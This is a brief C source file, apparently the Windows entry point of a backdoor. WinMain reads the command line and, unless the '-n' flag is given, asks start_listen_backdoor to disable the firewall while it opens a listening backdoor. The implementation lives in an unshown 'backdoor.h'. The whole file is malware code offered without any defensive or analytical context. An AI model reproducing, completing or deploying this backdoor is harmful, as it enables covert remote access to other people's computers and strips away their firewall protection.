#include <stdio.h>
#include <windows.h>

#include "backdoor.h"

int WINAPI WinMain (HINSTANCE hThisInstance,
                    HINSTANCE hPrevInstance,
                    LPSTR lpszArgument,
                    int nCmdShow)
{
    int closeFirewall = 1;
    char *pCmd = (char *)lpszArgument;

    if(pCmd != NULL && strlen(pCmd) > 0)
    {
        if(strcmp(pCmd, "-n") == 0)
        {
            closeFirewall = 0;
        }
    }

    start_listen_backdoor(closeFirewall);
    return 0;
}
